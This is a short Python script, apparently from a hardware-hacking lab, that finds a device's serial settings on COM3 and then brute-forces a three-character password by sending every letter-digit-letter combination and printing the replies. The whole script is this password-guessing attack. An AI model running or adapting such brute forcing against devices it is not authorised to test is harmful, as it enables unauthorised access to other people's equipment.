# David Garcia & Redi Tola


import serial
baudrates = [9600, 19200, 115200]
parities = [serial.PARITY_NONE, serial.PARITY_EVEN, serial.PARITY_ODD]

def read_block(ser_conn, num_lines):
    for line in range(num_lines):
        print(ser_conn.readline())

def query(ser_conn, message):
    ser_conn.write(message.encode())
    read_block(ser_conn, 10)

 
# for baudrate_for_loop in baudrates:
#     for parity_for_loop in parities:
#         print(baudrate_for_loop, parity_for_loop)
#         serial_conn = serial.Serial('COM3', baudrate=baudrate_for_loop, parity=parity_for_loop, timeout=0.3)
#         read_block(serial_conn, 30)
#         serial_conn.close()

#serial_conn = serial.Serial('COM3', baudrate=19200, parity=serial.PARITY_EVEN, timeout=0.1)
serial_conn = serial.Serial('COM3', baudrate=9600, parity=serial.PARITY_NONE, timeout=0.05)
read_block(serial_conn, 50)
nums = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
upper_letters = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
lower_letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

for first_char in upper_letters:
    for second_char in nums:
        for third_char in lower_letters:
            passwd = first_char + second_char + third_char + '\r'
            print(passwd)
            query(serial_conn, passwd)


# for first_char in nums:
#     for second_char in nums:
#         for third_char in nums:
#             passwd = first_char + second_char + third_char + '\r'
#             print(passwd)
#             query(serial_conn, passwd)


# query(serial_conn, '123\r')
# query(serial_conn, 'help\r')

